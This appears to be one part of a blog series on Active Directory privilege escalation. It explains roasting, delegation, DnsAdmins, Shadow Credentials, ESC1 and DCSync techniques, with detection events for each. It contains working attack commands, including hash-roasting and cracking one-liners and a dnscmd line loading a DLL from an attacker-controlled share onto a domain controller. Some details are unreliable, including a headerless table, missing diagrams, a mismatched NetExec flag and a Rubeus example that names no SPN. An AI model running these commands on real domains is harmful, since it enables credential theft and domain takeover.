> **Series Focus:** Part 1 mapped the architecture. Part 2 walked through enumerating it from an ordinary authenticated user's seat, and pointed out that the ACLs and delegation flags enumeration turns up form a connected graph rather than a list of findings. This part walks that graph: the specific techniques that turn one compromised low-privilege account into Domain Admin, explained assuming no prior exposure to any of them, using the tools actually current in 2026 rather than whatever a course written five years ago still teaches.

**TL;DR:** Privilege escalation in Active Directory is rarely a vulnerability, it is a series of design decisions being used exactly as designed, aimed at a target they weren't meant for. <Term concept="kerberoasting">Kerberoasting</Term> and <Term concept="asrep-roasting">AS-REP Roasting</Term> abuse Kerberos itself to get crackable material with no interaction, and <Term concept="timeroasting">Timeroasting</Term> gets the same crackable material from computer accounts through a completely different protocol, MS-SNTP, needing no credential at all. <Term concept="unconstrained-delegation">Unconstrained delegation</Term> and <Term concept="rbcd">Resource-Based Constrained Delegation</Term> abuse the mechanism built to let one service act on a user's behalf. <Term concept="dnsadmins">DnsAdmins</Term> membership, a group that sounds like DNS record delegation, actually grants a DLL-loading feature on the DNS service that turns into SYSTEM on a domain controller with one restart. <Term concept="shadow-credentials">Shadow Credentials</Term> abuses the same attribute Windows Hello for Business uses to store a passwordless credential. <Term concept="esc1">AD CS ESC1</Term> abuses a certificate template that never checked who it was actually issuing a certificate to. <Term concept="dcsync">DCSync</Term> abuses the replication protocol domain controllers use to trust each other, to walk out with the one hash, <Term concept="krbtgt">krbtgt</Term>'s, that ends the game via a <Term concept="golden-ticket">Golden Ticket</Term>. Every technique below gets the same treatment: what it actually does, a diagram where the chain has more than two steps, the current tool for it (<Term concept="rubeus">Rubeus</Term>, <Term concept="netexec">NetExec</Term>, <Term concept="certipy">Certipy</Term>), and the event ID or signal that catches it.

## Introduction

"Privilege escalation" in Active Directory rarely means finding a bug. It means using a permission, a protocol feature, or a delegation setting exactly the way it was designed to be used, just against a target nobody intended it to reach. Part 2 covered how an attacker builds the map: users, groups, ACLs, delegation flags, certificate templates, all readable by default to any authenticated account. This post covers what happens once that map shows an edge worth walking, from a first foothold to Domain Admin.

Two things before the techniques. First, none of this assumes you've read a specific prior AD course: every technique here is explained from what it actually does, not just named and left as an exercise. Where a chain has more than two steps, there's a diagram. Second, tooling in this space churns fast, and using stale tooling produces stale advice: CrackMapExec was archived in 2023 and its actively maintained successor is <Term concept="netexec">NetExec</Term>; PowerView still works but <Term concept="rubeus">Rubeus</Term> and NetExec cover most of what a modern engagement needs for the techniques below; and AD CS abuse used to mean the Windows-only Certify, but <Term concept="certipy">Certipy</Term> now does the same job cross-platform and is what most current tradecraft actually reaches for. Every tool named below is the one seeing active use and active commits right now.

## The Kerberos Exchange Every Technique Below Touches

Every technique in this post reaches into one of three Kerberos exchanges and either abuses a parameter that exchange was always willing to accept, or forges the output of one entirely. Before the individual techniques, here's the whole thing in one place, with the exact fields that matter.

One term worth pinning down before the diagram, since it isn't a fourth exchange, it's data riding inside the first one: **pre-authentication** is the encrypted timestamp attached to the AS-REQ in row 1 below. The client encrypts a timestamp with a key derived from its own password; the KDC, deriving the same key from the account's stored password hash, only returns an AS-REP with a TGT if that timestamp decrypts correctly. It's the proof-of-password step, and it's what's missing when an account has `UF_DONT_REQUIRE_PREAUTH` set, which is the entire gap AS-REP Roasting walks through.

|---|---|---|---|
| `cname` | AS-REQ | Names the requesting identity | Untouched here; forged entirely in a Golden Ticket, which skips the AS exchange altogether |
| Pre-auth timestamp | AS-REQ | Proves the client knows the account's password before the KDC issues a TGT | Absent when `UF_DONT_REQUIRE_PREAUTH` is set, the gap AS-REP Roasting abuses |
| TGT | AS-REP | A sealed, reusable proof of identity, cached in LSASS for the session | What Unconstrained Delegation harvests once a victim authenticates to a coerced or compromised host |
| `sname` (SPN) | TGS-REQ | Names the service the client wants a ticket for | The field Kerberoasting reads freely and Targeted Kerberoasting writes temporarily onto an otherwise SPN-less account |
| Encryption type (etype) | TGS-REP | Determines what key protects the returned ticket, RC4 (the account's NTLM hash, unsalted) or AES (PBKDF2-derived, salted) | What actually determines whether a Kerberoasted ticket cracks fast or barely at all |
| Forwardable flag | Any ticket | Marks whether a ticket may be re-delegated to a second service on the holder's behalf | What S4U2Proxy checks before RBCD's impersonation succeeds |
| PAC | TGT and service ticket | Carries the account's SID and group memberships, what a target actually trusts for authorization | What DCSync-derived Golden Tickets, Shadow Credentials' forged PKINIT logons, and ESC1's issued certificates all ultimately produce a valid one of |

## Credential Access via Kerberos: Kerberoasting and AS-REP Roasting

**Kerberoasting** works because of a specific, unremarkable design choice inside the ordinary TGS-REQ/TGS-REP exchange: any authenticated domain user can request a service ticket for any account with a registered <Term concept="spn">SPN</Term>, and the KDC issues it encrypted with a key derived from the target service account's own password, not the requester's. The requester never has to justify why it wants that ticket, and the KDC never checks whether the request makes sense for that account to receive, only that the requester holds a valid TGT, which is what the diagram below shows.

Which key the ticket is actually encrypted with depends on its encryption type (etype), and that detail is what makes cracking practical or not. An RC4 ticket is encrypted with a key that's simply the account's NTLM hash, no additional derivation or salting at all, which is why RC4-encrypted tickets crack fast and why cracking tooling defaults to requesting RC4 whenever the KDC will still issue it. An AES ticket derives its key via PBKDF2 from the account's actual password, salted deterministically with the realm name plus the account's username (or, for a computer account, its hostname), which makes offline cracking dramatically slower and is exactly why moving service accounts to AES-only encryption, covered in this technique's detection section below, is the mitigation Microsoft actually recommends over trying to detect every roast attempt. Because nothing here is a bug, Kerberos is doing exactly what the ticket-granting exchange was specified to do, the only real fix is making the password underneath the key uncrackable in the first place, either AES-only encryption or a Group Managed Service Account's long, random, automatically rotated password.

That RC4 key isn't a Kerberos-only concept, either. It's the exact same value NTLM authentication uses, which is worth seeing directly rather than taking on faith.

```bash
# Impacket, from Linux, dumps every roastable ticket in one pass
GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request -outputfile hashes.kerberoast

# Rubeus, from a domain-joined Windows host, targeting a single SPN
Rubeus.exe kerberoast /outfile:hashes.kerberoast

# NetExec, roasting every SPN a given credential can see over LDAP
netexec ldap $DC_IP -u $USER -p $PASSWORD --kerberoasting hashes.kerberoast

# offline cracking, mode 13100 is TGS-REP etype 23 (RC4)
hashcat -m 13100 hashes.kerberoast rockyou.txt
```

Ordinary Kerberoasting only reaches accounts that already have an SPN registered, which rules out roasting a privileged account that happens not to run a service. <Term concept="targeted-kerberoasting">Targeted Kerberoasting</Term> removes that restriction: an attacker holding `GenericAll`, `GenericWrite`, `WriteProperty`, or `Validated-SPN` rights on a target account, exactly the kind of ACE Part 1's security descriptor diagram and Part 2's BloodHound tooling are built to surface, writes a throwaway SPN onto that account, requests the now-roastable ticket, and deletes the SPN again immediately after. The account was never running a service and never needed to be; the write access was the only thing missing.

**Requirements:** `GenericAll`, `GenericWrite`, `WriteProperty`, or `Validated-SPN` on the target account's `servicePrincipalName` attribute, which BloodHound reports as an outbound edge from whatever principal the attacker already controls.

```bash
# writes a throwaway SPN, roasts it, deletes the SPN, in one pass
targetedKerberoast.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP

# NetExec's equivalent, against every writable account it finds
netexec ldap $DC_IP -u $USER -p $PASSWORD --kerberoasting hashes.kerberoast --gen-relay-list

hashcat -m 13100 hashes.kerberoast rockyou.txt
```

The write-then-delete pattern on `servicePrincipalName` is itself a detection opportunity distinct from the roast: an SPN appearing and disappearing on an account within seconds, visible in **event 5136**, is a stronger signal than the roast's own RC4 ticket request.

**AS-REP Roasting** is the same offline-cracking idea, one protocol step earlier. Normally, the very first message a client sends the KDC (the AS-REQ) includes a timestamp encrypted with a key derived from the user's password, and the KDC only issues an AS-REP (containing a TGT) back if it can decrypt that timestamp correctly, proving the client actually knows the password. This is called pre-authentication, and it's on by default. Some accounts have it explicitly disabled, the `UF_DONT_REQUIRE_PREAUTH` flag on `userAccountControl`, usually left over from compatibility with an old application. For those accounts, the KDC skips the proof entirely and returns an AS-REP to anyone who asks for one by username, no password required to trigger it. That AS-REP is encrypted with a key derived from the target's actual password, so an attacker takes it offline and cracks it exactly like a Kerberoasted ticket, except no credential was needed to obtain it in the first place, only a valid username.

**Requirements:** a list of valid usernames (no password, no domain session needed at all) and at least one of those accounts having `UF_DONT_REQUIRE_PREAUTH` set, which a prior enumeration pass (Part 2) or an anonymous LDAP bind, if allowed, can identify directly.

**Detection.** Both techniques leave a specific fingerprint in the encryption type and volume of Kerberos requests, not in any single request looking wrong. AS-REP Roasting shows up as **event 4768** (TGT requested) for an account, with no corresponding pre-authentication success pattern and, again, frequently RC4. Neither is loud on its own; both are exactly the kind of query-volume anomaly Microsoft Defender for Identity is built to baseline and alert on, covered in Part 1's collection points table.

## Timeroasting: The Same Idea, a Different Protocol

<Term concept="timeroasting">Timeroasting</Term> gets the "-roasting" name by resemblance, not by mechanism: it doesn't touch Kerberos at all. Domain-joined computers keep their clocks synchronized against a domain controller using MS-SNTP, Microsoft's authenticated extension to NTP, and that authentication works by having the client include its own computer account's RID in the request; the DC responds with a Message Authentication Code computed using a key derived from that computer account's NTLM hash. Nothing about that request has to be authenticated first. Anyone who can reach UDP 123 on a DC can supply any RID they want and get back a MAC keyed to whatever computer account that RID belongs to, with no domain credential of any kind, not even a valid username the way AS-REP Roasting still requires.

**Requirements:** network reachability to a domain controller's NTP service (UDP 123), nothing else. Cracking is the same story as any other roast: it only works against a computer account whose password isn't the strong, randomly generated, auto-rotated one Windows assigns by default, which in practice means legacy provisioning, manually set computer passwords, or accounts created through `net computer` rather than normal domain join.

Timeroasting only returns a RID, not a hostname, since MS-SNTP never asked who's asking. With a valid domain credential in hand, `Invoke-AuthenticatedTimeRoast` resolves every RID to its computer name automatically and, per Secura's own research, cracks roughly ten times faster than an equivalent Kerberos TGS-REP because the SNTP MAC involves a lighter computation than Kerberos's etype 23 encryption. Neither variant makes a properly randomized machine password crackable; what both variants are actually good at is finding the small number of computer accounts in a domain that never got one.

**Detection.** This is the uncomfortable one: NTP traffic to a domain controller is constant, expected, and essentially unmonitored in most environments, so Timeroasting generates close to no distinguishing signal by design, which is exactly why current tradecraft favors it over adapting Kerberoasting to target computer accounts. There is no dedicated MS-SNTP audit event to point to. The realistic mitigation is upstream of detection entirely: audit for computer accounts with `PASSWORD_EXPIRED` unset for unusually long periods or provisioned outside normal domain join, since those are the accounts a randomized-password default was supposed to protect and Timeroasting is specifically good at finding the ones that slipped through.

## Delegation Abuse: Unconstrained Delegation and Resource-Based Constrained Delegation

Delegation exists to solve a real problem: a front-end service (a web app, a file server) sometimes needs to act as the user talking to it when it turns around and talks to a second, back-end service, without that user typing their password twice. Kerberos has three ways to do this, and the oldest one is dangerously broad.

**Unconstrained delegation** is a flag on a computer account, `TRUSTED_FOR_DELEGATION`, that says: this server may cache a full copy of the TGT of anyone who authenticates to it, and reuse that TGT to act as them against anything in the domain, not just one back-end service. It predates the more careful delegation models below and still shows up constantly, print servers being the classic, frequently forgotten example. Compromising a machine configured this way means every TGT that ever passed through its LSASS is sitting there for the taking, and an attacker doesn't have to wait: coercion techniques like PetitPotam or the printer bug can force a machine account, or in a worse case a privileged one, to authenticate to an attacker-controlled unconstrained-delegation host on demand.

**Requirements:** administrative access on a host already trusted for delegation (or the ability to stand one up), plus a coercion primitive, an RPC call over MS-EFSRPC (PetitPotam) or MS-RPRN (the printer bug) that can be pointed at a target that hasn't patched or mitigated it, which is most of what makes this attack practical rather than a wait-and-hope.

**Resource-Based Constrained Delegation (RBCD)** is the modern, narrower replacement, and it flips who controls the trust: instead of a front-end server being globally trusted for delegation, the back-end resource itself lists exactly which accounts may delegate to it, in an attribute called `msDS-AllowedToActOnBehalfOfOtherIdentity`. That flip is exactly what makes it abusable in a different way: whoever can write that attribute on a computer object controls who gets to impersonate users against it, and writing it doesn't require domain admin, only `GenericWrite` (or equivalent) on that one computer object, an ACE that's easy to overlook. If the attacker doesn't already control a computer account to name in that attribute, <Term concept="machine-account-quota">machine account quota</Term>, ten by default for any authenticated user, lets them create one.

**Requirements:** `GenericWrite` (or equivalent) on the target computer object, and control of some computer account to name as the delegate, either one already held or one created on the spot via machine account quota.

Setup is two writes, not a protocol exchange: create (or reuse) an attacker-controlled computer account, then set `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer to point at it. What actually moves the identity is the S4U exchange that follows, two request/response pairs against the KDC, and the second one only succeeds because the first attribute write told the KDC to trust it.

## DnsAdmins to SYSTEM: The ServerLevelPluginDll Feature

<Term concept="dnsadmins">DnsAdmins</Term> reads like a group scoped to editing DNS records, and to a directory admin skimming a group list, it doesn't stand out the way Domain Admins or Backup Operators do. What it actually grants is management rights over the DNS server itself, including a setting called `ServerLevelPluginDll`, `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll` on the box, that tells the DNS Server service which DLL to load into its own process at startup. The DNS role is almost always installed directly on a domain controller, and the DNS service runs as SYSTEM there like everything else Windows considers core infrastructure. Point that setting at an attacker-controlled DLL and restart the service, and DnsAdmins membership, a group that looks like a helpdesk delegation, turns into SYSTEM on a domain controller.

**Requirements:** membership in DnsAdmins (or equivalent write access to the DNS server's AD object), and the ability to restart the DNS service, which DnsAdmins members can do directly since the group also controls the Windows service itself, not just DNS records.

The DLL itself has to export three functions, `DnsPluginInitialize`, `DnsPluginQuery`, and `DnsPluginCleanup`, each returning success, or the DNS service refuses to load it.
```bash
# set the plugin DLL, talking to the DNS server over MS-DNSP RPC
dnscmd.exe \\dc01 /config /serverlevelplugindll \\attacker-host\share\mimilib.dll

# DnsAdmins also controls the DNS Windows service itself: restart it to force the load
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

**Detection.** The DNS Server event log records **event 770** every time the service starts and loads a plugin DLL, including the full path, which is close to unambiguous when that path is a UNC share rather than a local file. The best control is upstream of all of this: DnsAdmins membership should be reviewed and tiered exactly like Domain Admins, since its actual reach doesn't match what the group's name suggests to anyone who hasn't read this far.

## Shadow Credentials

Windows Hello for Business needs a way to authenticate a user with a public key instead of a password, and the attribute that stores that key material is `msDS-KeyCredentialLink`. It's a multi-valued attribute on user and computer objects, and, like every other attribute in AD, whether it can be written depends entirely on the object's ACL. An attacker with `GenericWrite`, `GenericAll`, or a couple of other ACE types on a target account can append their own key pair to that attribute, then authenticate as that account using <Term concept="pkinit">PKINIT</Term> and the private half of the key they just added, no password needed, no password changed.

The detail worth sitting with: this technique doesn't require Active Directory Certificate Services to be deployed at all. It uses the Key Trust model, which needs only a domain controller running Windows Server 2016 or later with a server authentication certificate (something most DCs already have for LDAPS) and the domain at the 2016 functional level. That's a much lower bar than most people assume, and it's why write access to this one attribute deserves the same weight as write access to a password reset right during an ACL review.

**Requirements:** `GenericWrite`, `GenericAll`, or `WriteProperty` on `msDS-KeyCredentialLink` for the target account, plus a DC at Windows Server 2016 or later and the domain at the 2016 functional level (both true in the overwhelming majority of current environments).

## AD CS Escalation: ESC1

<Term concept="adcs">Active Directory Certificate Services</Term> is Microsoft's in-domain PKI, and it matters here for one specific reason: a certificate can substitute for a password during Kerberos authentication, via PKINIT, exactly as in the Shadow Credentials technique above. That means a misconfigured certificate template isn't just a PKI hygiene issue, it's a direct route to a TGT for whatever identity the certificate claims to belong to. This whole category was catalogued by Will Schroeder and Lee Christensen's 2021 "Certified Pre-Owned" research as the ESC1 through ESC8 techniques, and the list has kept growing since, past ESC16 in current tooling, as more misconfiguration classes get documented.

**ESC1** is the simplest and most common of them, and a good example of the whole category. A certificate template is vulnerable when three things are all true at once: it lets the requester supply their own Subject Alternative Name (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) rather than the CA filling it in from the requester's own AD identity, it includes the Client Authentication EKU (so the resulting certificate is valid for PKINIT), and enrollment rights on the template are granted broadly, often to `Domain Users` or `Authenticated Users`, because nobody expected the SAN field to matter.

**Requirements:** enrollment rights on a template with all three properties above, which in practice means any authenticated domain user, since that's exactly who ESC1 templates tend to grant enrollment to.

## DCSync and the Golden Ticket Endgame

Domain controllers trust each other with a specific replication protocol, `MS-DRSR`, running over RPC and generally referred to by its interface name, DRSUAPI. Any account holding the `Replicating Directory Changes` and `Replicating Directory Changes All` rights, ordinarily just Domain Admins, Enterprise Admins, and the DCs themselves, can bind to a DC over DRSUAPI and call `DRSGetNCChanges`, the exact RPC method real domain controllers call on each other to replicate, asking for any object's data, including password hashes, as though the requester were another domain controller. This is <Term concept="dcsync">DCSync</Term>, and the object worth asking for is always the same one: `krbtgt`, whose password hash is what encrypts and signs every Kerberos ticket in the domain.

**Requirements:** `Replicating Directory Changes` and `Replicating Directory Changes All` extended rights on the domain naming context, which is where the entire chain of techniques above is usually aimed, since these rights are rarely granted directly and almost always reached by first escalating to an account, or a machine account's TGT, that already holds them.

Once an attacker holds that hash, they can forge a <Term concept="golden-ticket">Golden Ticket</Term>: a Kerberos TGT built entirely offline, valid for any username and any group membership the attacker writes into it, including accounts that don't exist. Because it never touches a domain controller during creation, no authentication event marks the moment it's forged, only its later use.

## Detection Recap

Every technique above gets its own signal, but seeing them side by side is what turns individual alerts into a program. This extends the collection points table from Part 1 with the specific event or signal each technique produces.

| Technique | Primary signal | Where to look |
|---|---|---|
| Kerberoasting | TGS-REQ burst for many SPNs from one account, often RC4 | Event 4769 on the DC; MDI |
| AS-REP Roasting | AS-REQ for a no-preauth account, no proof of password | Event 4768 on the DC; MDI |
| Timeroasting | MS-SNTP request for an arbitrary RID, no authentication | No dedicated audit event; monitor for weak/legacy computer passwords upstream |
| Unconstrained delegation abuse | TRUSTED_FOR_DELEGATION set on a computer; coercion attempts | Event 4738 / 5136; MDI coercion alerts |
| RBCD abuse | Write to msDS-AllowedToActOnBehalfOfOtherIdentity; computer account creation burst | Event 5136 (if SACL set); event 4741 |
| DnsAdmins ServerLevelPluginDll | Plugin DLL loaded from a UNC path; unscheduled DNS service restart | DNS Server event 770; event 4657 (if SACL set); event 7036 |
| Shadow Credentials | Write to msDS-KeyCredentialLink; certificate-based AS-REQ | Event 5136 (if SACL set); event 4768 |
| AD CS ESC1 | Certificate issued with a SAN that doesn't match the requester | CA events 4886/4887; proactive `certipy find -vulnerable` |
| DCSync | Replication request from a non-DC source IP | Event 4662 with replication GUIDs; MDI DCSync alert |
| Golden Ticket | No creation event; abnormal ticket use after a suspected DCSync | MDI anomaly detection; krbtgt rotation as mitigation |

## Conclusion

Nothing in this post exploited a vulnerability in the CVE sense. Kerberoasting and AS-REP Roasting use Kerberos exactly as specified, and Timeroasting gets the same result from a protocol, MS-SNTP, that was never asked to authenticate anything in the first place. Unconstrained delegation and RBCD use delegation exactly as designed. DnsAdmins uses a DNS server management feature exactly as documented, on a group whose name just doesn't advertise what that feature actually reaches. Shadow Credentials uses the same key-trust mechanism Windows Hello for Business relies on. ESC1 uses certificate enrollment exactly as the template configured it to work. DCSync uses the replication protocol every domain controller depends on. The common thread across all eight is that AD's permission model, or in Timeroasting's case, the complete absence of one at the protocol level, decides which of these design features an account is actually allowed to reach, and privilege escalation is what happens when that permission model has drifted from what anyone intended, which per Part 1 is the security descriptor's job in the first place. Enumeration, Part 2's subject, is how that drift gets found before an attacker finds it first, and detecting the techniques in this post, which is what most of it has been about, is the layer that catches the drift nobody found in time.
